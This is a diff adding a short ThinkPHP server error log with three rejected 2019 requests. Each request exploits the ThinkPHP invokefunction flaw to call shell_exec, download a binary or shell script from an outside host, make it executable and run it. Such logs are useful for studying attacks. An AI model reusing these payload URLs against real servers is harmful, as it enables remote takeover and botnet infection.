@@ -1,0 +1,9 @@
+[ 2019-02-08T01:42:17+08:00 ] 185.172.110.88 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://185.244.25.159/bins/x86;%20chmod%20777%20x86;./x86%20thinkphp
+ERR: 非法操作:\think\app
+
+[ 2019-02-08T05:33:46+08:00 ] 185.172.110.88 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://185.244.25.159/bins/x86;%20chmod%20777%20x86;./x86%20thinkphp
+ERR: 非法操作:\think\app
+
+[ 2019-02-08T12:24:06+08:00 ] 185.244.25.128 /index.php?s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=wget%20http://infinityondemand.ga/bins/infinity.sh;%20chmod%20+x%20infinity.sh;%20sh%20infinity.sh%20
+ERR: 非法操作:\think\app
+
